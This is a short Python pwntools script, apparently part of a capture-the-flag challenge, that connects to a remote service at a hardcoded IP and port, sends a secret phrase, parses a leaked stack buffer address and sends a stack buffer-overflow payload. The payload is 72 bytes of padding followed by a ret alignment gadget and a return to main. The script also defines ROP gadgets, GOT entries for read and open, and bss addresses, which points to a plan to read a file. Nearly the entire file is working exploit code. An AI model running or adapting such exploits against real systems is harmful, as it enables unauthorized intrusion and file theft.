#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
ret_gadget = 0x401016
csu_pop = 0x401512
csu_call = 0x4014f8
got_read = 0x403250
got_open = 0x403278
bss_path = 0x404100
bss_data = 0x404200

# Test: ret2main with proper alignment
payload = b'A' * 72
payload += p64(ret_gadget)   # alignment
payload += p64(0x401393)     # main
print(f'Test: ret2main with alignment, {len(payload)}B')
r.send(payload)
try:
    data = r.recv(timeout=5)
    print(f'Data: {data[:200]}')
    if b'Spooktober' in data:
        print('ret2main with alignment works!')
except Exception as e:
    print(f'Error: {e}')
r.close()
